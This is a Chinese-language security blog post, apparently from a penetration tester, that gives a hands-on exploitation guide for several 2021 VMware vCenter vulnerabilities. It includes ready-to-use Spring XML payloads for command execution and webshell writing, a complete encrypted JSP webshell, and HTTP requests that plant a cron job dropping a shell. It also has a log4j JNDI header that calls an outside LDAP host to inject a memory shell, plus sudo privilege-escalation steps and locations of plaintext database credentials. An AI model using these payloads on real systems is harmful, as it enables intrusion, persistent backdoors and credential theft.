@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="tiehanhan" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      vCenter2021几个漏洞及后渗透 
+      
+      
+      |
+    
+     daidaitiehanhan&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar.gif">
+    <link rel="icon" href="/images/avatar.gif">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.gif" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">tiehanhan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">vCenter2021几个漏洞及后渗透</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-04-18 23:36:19
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h2><p>参考<a target="_blank" rel="noopener" href="https://www.vmware.com/security/advisories/VMSA-2017-0004.html">官方公告</a>，一些老的Vcenter可以用S2-045直接冲。</p>
+<h2 id="CVE-2021-21972"><a href="#CVE-2021-21972" class="headerlink" title="CVE-2021-21972"></a>CVE-2021-21972</h2><p>任意文件上传漏洞，会解压用户tar中的文件并写入到服务器，此洞拿到shell后默认需要提权</p>
+<p>接口在**&#x2F;ui&#x2F;vropspluginui&#x2F;rest&#x2F;services&#x2F;uploadova**</p>
+<p>利用思路:</p>
+<ul>
+<li>写webshell</li>
+<li>写私钥</li>
+</ul>
+<h3 id="写私钥"><a href="#写私钥" class="headerlink" title="写私钥"></a>写私钥</h3><p>往目录..&#x2F;..&#x2F;home&#x2F;vsphere-ui&#x2F;.ssh&#x2F;authorized_keys写就行</p>
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><h4 id="Linuxshell路径"><a href="#Linuxshell路径" class="headerlink" title="Linuxshell路径"></a>Linuxshell路径</h4><p><strong>..&#x2F;..&#x2F;usr&#x2F;lib&#x2F;vmware-vsphere-ui&#x2F;server&#x2F;work&#x2F;deployer&#x2F;s&#x2F;global&#x2F;41&#x2F;0&#x2F;h5ngc.war&#x2F;resources&#x2F;log.jsp</strong></p>
+<p><strong>对应shell地址是&#x2F;ui&#x2F;resources&#x2F;log.jsp</strong></p>
+<h4 id="Windows路径"><a href="#Windows路径" class="headerlink" title="Windows路径"></a>Windows路径</h4><p><strong>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ProgramData&#x2F;VMware&#x2F;vCenterServer&#x2F;data&#x2F;perfcharts&#x2F;tc-instance&#x2F;webapps&#x2F;statsreport&#x2F;log.jsp</strong></p>
+<p><strong>对应shell地址是&#x2F;statsreport&#x2F;log.jsp</strong></p>
+<p>vcenter访问不存在的路由比如&#x2F;xx&#x2F;xx会返回401，访问&#x2F;resources&#x2F;xx这种会返回404，有时候我们写shell到statsreport访问返回401，可能是statsreport这个模块没起来，可以试试其他路径如</p>
+<p><strong>..&#x2F;..&#x2F;..&#x2F;..&#x2F;ProgramData&#x2F;VMware&#x2F;vCenterServer&#x2F;runtime&#x2F;VMwareSTSService&#x2F;webapps&#x2F;openidconnect&#x2F;log.jsp</strong></p>
+<p>对应shell地址是openidconnect&#x2F;log.jsp</p>
+<p>或者写入&#x2F;vsphrere-client&#x2F;</p>
+<p>对应Vcenter 6.7的路径是</p>
+<p><strong>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ProgramData&#x2F;VMware&#x2F;vCenterServer&#x2F;runtime&#x2F;vsphere-client&#x2F;server&#x2F;work&#x2F;deployer&#x2F;s&#x2F;global&#x2F;29&#x2F;container-app-war.war&#x2F;log.jsp</strong></p>
+<p>Vcenter 6.5对应的路径是:</p>
+<p><strong>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ProgramData&#x2F;VMware&#x2F;vCenterServer&#x2F;runtime&#x2F;vsphere-client&#x2F;server&#x2F;work&#x2F;deployer&#x2F;s&#x2F;global&#x2F;27&#x2F;0&#x2F;container-app-war-6.1.0.war</strong>&#x2F;log.jsp</p>
+<p><strong>对应shell地址是&#x2F;vsphere-client&#x2F;log.jsp</strong></p>
+<h2 id="CVE-2021-21985"><a href="#CVE-2021-21985" class="headerlink" title="CVE-2021-21985"></a>CVE-2021-21985</h2><p>此洞拿到shell后默认需要提权</p>
+<h3 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h3><p><a target="_blank" rel="noopener" href="https://github.com/r0ckysec/CVE-2021-21985">https://github.com/r0ckysec/CVE-2021-21985</a></p>
+<p>利用ClassPathXmlApplicationContext类加载xml文件触发spel注入，weblogic和jackson都有关于这个类的cve，利用方式都差不多。</p>
+<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>网上脚本里很多</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[ whoami 2&gt;&amp;1 ]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;is&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>#&#123;pb.start().getInputStream()&#125;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;br&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>#&#123;is&#125;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;collectors&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.util.stream.Collectors&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;system&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.System&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; system.setProperty(<span class="symbol">&amp;quot;</span>output<span class="symbol">&amp;quot;</span>, br.lines().collect(collectors.joining(<span class="symbol">&amp;quot;</span>\n<span class="symbol">&amp;quot;</span>))) &#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>写文件的xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/log2.jsp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;is&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[&lt;% if (session.getAttribute(&quot;isLogin&quot;) != null) &#123; ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); try &#123; Class.forName(application.getAttribute(&quot;Cookies&quot;) + &quot;&quot;,false,classLoader).getMethod(&quot;invoke&quot;, new Class[]&#123;HttpServletRequest.class, HttpServletResponse.class&#125;).invoke(null, new Object[]&#123;request, response&#125;); &#125; catch (ClassNotFoundException e) &#123; java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, new Class[]&#123;byte[].class, int.class, int.class&#125;); method.setAccessible(true); java.io.InputStream inputStream = request.getInputStream(); java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream(); int n = 0; while ((n = inputStream.read()) != -1) byteArrayOutputStream.write(n); javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(&quot;DES&quot;); cipher.init(2, javax.crypto.SecretKeyFactory.getInstance(&quot;DES&quot;).generateSecret(new javax.crypto.spec.DESKeySpec(session.getAttribute(&quot;isLogin&quot;).toString().getBytes()))); byte[] ddat = cipher.doFinal(byteArrayOutputStream.toByteArray()); Class m = (Class) method.invoke(classLoader, new Object[]&#123;ddat, new Integer(0), new Integer(ddat.length)&#125;); application.setAttribute(&quot;Cookies&quot;, m.getName()); response.addCookie(new Cookie(&quot;X-Ua-Compatible&quot;, java.util.UUID.randomUUID().toString())); &#125; &#125; else if (request.getHeader(&quot;Cookie&quot;) != null &amp;&amp; request.getHeader(&quot;Cookie&quot;).indexOf(&quot;7x4T2T8y&quot;) != -1) &#123; String isLogin = java.util.UUID.randomUUID().toString().replaceAll(&quot;-&quot;, &quot;&quot;).toUpperCase(); response.addCookie(new Cookie(&quot;eagleeye-traceid&quot;, isLogin)); session.setAttribute(&quot;isLogin&quot;, isLogin.substring(0, 8)); &#125; out.clear(); out = pageContext.pushBody(); %&gt; ]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.println(is).close()&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="BCEL执行java字节码"><a href="#BCEL执行java字节码" class="headerlink" title="BCEL执行java字节码"></a>BCEL执行java字节码</h4><p>bcel执行java代码的xml，这样注内存马更方便。</p>
+<p>注意:vCemter 7u3j及以上默认java版本是jdk8u251，此版本bcel无法使用。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;is&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[$$BCEL$$...]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.loadClass(is).newInstance()&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="出网利用"><a href="#出网利用" class="headerlink" title="出网利用"></a>出网利用</h3><p>还有种利用方法是jndi注入，没啥特别需要讲的，正常的jndi利用就行</p>
+<h2 id="CVE-2021-22005"><a href="#CVE-2021-22005" class="headerlink" title="CVE-2021-22005"></a>CVE-2021-22005</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul>
+<li>vCenter Server 7.0 &lt; 7.0 U2c build-18356314</li>
+<li>vCenter Server 6.7 &lt; 6.7 U3o build-18485166</li>
+<li>Cloud Foundation (vCenter Server) 4.x &lt; KB85718 (4.3)</li>
+<li>Cloud Foundation (vCenter Server) 3.x &lt; KB85719 (3.10.2.2)</li>
+<li>6.7 vCenters Windows版本不受影响</li>
+</ul>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>两种触发方式，一种是开启CIEP时(可发送特殊数据包开启)通过log4j记录日志的功能实现任意文件写入，另一种是通过Velocity模板注入执行代码。这个漏洞拿到的权限是root权限。</p>
+<h4 id="CIEP"><a href="#CIEP" class="headerlink" title="CIEP"></a>CIEP</h4><p>可以写入任意文件，但是写入后的文件后缀固定是.json。_i参数控制可跳跃的路径，最终写入的文件路径如果存在就会把内容追加进文件，不存在就会创建文件，但当如果我们写入的文件名是因某些因素被删除过的文件名，则无法正常写文件。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/analytics/telemetry/ph-stg/api/hyper/send?_c=&amp;_i=/../../../../../../tmp/okok</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.16.64.143</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2</span><br><span class="line"></span><br><span class="line"><span class="language-ebnf"><span class="attribute">ok</span></span></span><br></pre></td></tr></table></figure>
+
+<p>由于只能写入.json后缀的文件，所以略微有点鸡肋，但是对于linux的机器我们可以写入计划任务来执行写shell的操作</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/analytics/telemetry/ph-stg/api/hyper/send?_c=&amp;_i=/../../../../../../etc/cron.d/appl3</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.16.64.143</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>144</span><br><span class="line"></span><br><span class="line"><span class="language-awk">* * * * * root echo PCUgICAgICAgIG91dC5wcmludGxuKCJIZWxsb1dvcmxkIik7ICAgICAgJT4=|base64 -d&gt;<span class="regexp">/usr/</span>lib<span class="regexp">/vmware-sso/</span>vmware-sts<span class="regexp">/webapps/</span>ROOT/hello.jsp</span></span><br></pre></td></tr></table></figure>
+
+<p>等60s后可在<a target="_blank" rel="noopener" href="https://172.16.64.143/idm/..;/hello.jsp">https://172.16.64.143/idm/..;/hello.jsp</a> 可以访问到shell(这里的<code>/..;/</code>是因为Tomcat会将<code>/..;/</code>视作<code>/../</code>，可以利用该特性绕过vCenter某些版本的rhttpproxy的访问限制)。</p>
+<h4 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h4><p>VelocityHelper.executeVelocityExpression触发velocity表达式执行。</p>
+<p>可以用<a target="_blank" rel="noopener" href="https://github.com/r0ckysec/CVE-2021-22005">这个师傅的脚本</a>打</p>
+<h2 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h2><p>可以直接写入内存马，且vcenter默认是tomcat，可以尝试利用tomcatbypass模块绕过jndi高版本限制写入内存马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1</span><br><span class="line">Host: 172.16.64.143</span><br><span class="line">User-Agent: curl/7.64.1</span><br><span class="line">Accept: */*</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://172.16.64.1:1389/TomcatBypass/TomcatMemshell1&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="CVE-2021-3156"><a href="#CVE-2021-3156" class="headerlink" title="CVE-2021-3156"></a>CVE-2021-3156</h4><p><a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156">https://github.com/worawit/CVE-2021-3156</a></p>
+<p>vCenter的linux版可以直接用sudo提权(测了7u1和7u3j)，直接用网上的python脚本，c写的要编译，更麻烦。</p>
+<p>重点讲讲两个脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156/blob/main/exploit_defaults_mailer.py">exploit_defaults_mailer.py</a></p>
+<p>需要在交互的情景使用，使用后会在&#x2F;tmp&#x2F;目录下生成一个二进制文件，执行文件即可获得一个root的shell</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156/blob/main/exploit_userspec.py">exploit_userspec.py</a></p>
+<p>往指定地点写入文件内容，这个脚本会往&#x2F;etc&#x2F;passwd目录下写入一个gg用户，其实就是一个任意文件写入的利用。</p>
+<p>我们可以通过更改写入的路径和写入的内容，写一个root权限的webshell到vCenter服务器上</p>
+<p><img src="/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/image-20220218111611577.png" alt="image-20220218111611577"></p>
+<p>改动PASSWD_PATH&#x3D;b’&#x2F;usr&#x2F;lib&#x2F;vmware-sso&#x2F;vmware-sts&#x2F;webapps&#x2F;ROOT&#x2F;1.jsp’</p>
+<p>APPEND_CONTENT&#x3D;b’webshell内容’</p>
+<p>即可在<a target="_blank" rel="noopener" href="https://172.16.xx.xx/idm/..;/1.jsp">https://172.16.xx.xx/idm/..;/1.jsp</a> (这里是用到了一个tomcat越权的tips，可以参考CVE-2021-22005的利用)得到一个root权限的webshell</p>
+<h3 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h3><p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%974-PostgreSQL">https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%974-PostgreSQL</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/shmilylty/vhost_password_decrypt">https://github.com/shmilylty/vhost_password_decrypt</a></p>
+<p>vcenter默认数据库文件在windwos和linux下都叫vcdb.properties，配置文件中有数据库的明文账号密码</p>
+<p>linux默认路径:</p>
+<ul>
+<li>&#x2F;etc&#x2F;vmware-vpx&#x2F;vcdb.properties</li>
+<li>&#x2F;etc&#x2F;vmware&#x2F;service-state&#x2F;vpxd&#x2F;vcdb.properties</li>
+</ul>
+<p>Windows默认路径:</p>
+<ul>
+<li>C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</li>
+<li>C:\ProgramData\VMware\VMware VirtualCenter\vcdb.properties</li>
+</ul>
+<p>利用数据库账号密码登录数据库，默认是postgresql数据库，默认只能在vCenter服务器本地登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -h localhost -d VCDB -U vc</span><br></pre></td></tr></table></figure>
+
+<p>查询虚拟主机信息:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VCDB<span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> id,datacenter_id,file_name,guest_os,ip_address,config <span class="keyword">FROM</span> vc.vpx_vm;</span><br><span class="line"> id <span class="operator">|</span> datacenter_id <span class="operator">|</span>                                        file_name                                         <span class="operator">|</span> guest_os <span class="operator">|</span> ip_address <span class="operator">|</span> config </span><br><span class="line"><span class="comment">----+---------------+------------------------------------------------------------------------------------------+----------+------------+--------</span></span><br><span class="line"> <span class="number">43</span> <span class="operator">|</span>             <span class="number">2</span> <span class="operator">|</span> ds:<span 